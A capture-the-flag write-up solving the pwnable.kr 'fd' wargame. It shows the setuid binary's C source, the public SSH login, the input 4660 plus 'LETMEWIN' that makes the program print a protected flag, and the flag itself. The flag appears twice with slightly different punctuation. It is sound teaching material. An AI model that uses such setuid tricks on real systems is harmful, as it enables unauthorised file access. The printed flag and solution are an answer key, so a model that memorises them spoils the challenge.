# fd

![](http://pwnable.kr/img/fd.png)

# Problem

> Mommy! what is a file descriptor in Linux?
>
> * try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
> https://youtu.be/971eZhMHQQw
>
> ssh fd@pwnable.kr -p2222 (pw:guest)

# Play

```
fd@ubuntu:~$ ls -l
total 16
-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd
-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c
-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag
fd@ubuntu:~$ cat fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
```

1. Note *setuid* on binary `fd`, and access rights for `flag`
2. compare with a read string `"LETMEWIN"`
3. `0` is for `STDIN_FILENO` by default, so we enter `4660` in decimal (`0x1234` in heximal)

```
fd@ubuntu:~$ ./fd 4660 #0x1234
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```

# Flag

```
mommy! I think I know what a file descriptor is!
```
